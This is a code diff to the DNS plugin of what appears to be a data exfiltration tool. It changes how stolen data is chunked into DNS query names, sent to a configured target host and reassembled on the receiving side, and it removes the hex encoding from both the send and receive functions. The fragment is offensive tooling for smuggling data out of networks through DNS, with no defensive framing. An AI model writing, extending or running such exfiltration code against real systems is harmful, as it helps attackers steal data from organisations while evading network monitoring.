@@ -26,7 +26,7 @@ def handle_dns_packet(x):
             if data not in buf[jobid]:
                 buf[jobid].append(data)
             if (len(qname) < 68):
-                app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
+                app_exfiltrate.retrieve_data(''.join(buf[jobid]))
                 buf[jobid] = []
     except Exception as e:
         # print e
@@ -37,7 +37,7 @@ def send(data):
     target = config['target']
     port = config['port']
     jobid = data.split("|!|")[0]
-    data = data.encode('hex')
+    data = data
     while data != "":
         tmp = data[:66 - len(config['key']) - len(jobid)]
         data = data.replace(tmp, '')
